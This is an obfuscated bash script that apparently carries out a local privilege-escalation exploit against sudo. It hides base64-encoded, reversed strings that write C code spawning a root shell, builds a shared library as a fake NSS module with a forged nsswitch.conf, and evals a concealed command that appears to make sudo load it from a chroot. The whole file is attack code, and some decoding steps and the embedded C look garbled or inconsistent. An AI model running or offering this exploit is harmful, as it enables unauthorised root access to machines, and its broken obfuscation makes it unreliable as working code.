#!/bin/bash

__a=$(echo 'WFhYWFguZXRhdHNyb29yL3BtcHQvIC1kIHBtZXQrbWs=' | rev | base64 -d)
__b=$(eval "$__a")
cd "${__b:?}" || exit 1

__c=$(echo 'KgApSTEwLDU1ICIsImhhc2JiL25pYiIvKDooZXhlYyB0aXJpZCgiLyIpOwp7CIg7KCwwKDkpZGlnZXJlc3RlcgAgICAKOwApMCwwKDkldWVpcmV0c2VzCiAgICB7KHZvaWQob3Jvb3Jla2FmIHZvaWQgKSgpcnV0Y3VydHNvY2NvIwojaW5jbHVkZSA8dW5pc3RkLmg+CgkjaW5jbHVkZSA8c3RkbGliLmg+Cg==' | rev)
echo "$__c" | base64 -d > .x

__d=$(echo 'Y3NzbnNzL2M3MzMxc3M0Y25jIC0tbCByZWQ0Y2hpY2VrcA==' | base64 -d | rev)
__e="fakeroot/etc"
__f="libnss_"
mkdir -p "$__e" "$__f" 2>/dev/null
echo "$(rev <<< '/7331ssnc')" > "$__e/nsswitch.conf"
cp /etc/group "$__e" 2>/dev/null

$(which gcc) -shared -fPIC -Wl,-init,fakeroot -o "$__f/$(rev <<< '2.os.so7331ssnc')" .x

__g=$(echo "ZmFrZXJvb3QgIHIgT2R1c3VzIC0K" | base64 -d | rev)
eval "$(echo "$__g" | rev)"

rm -rf "${__b:?}" 2>/dev/null
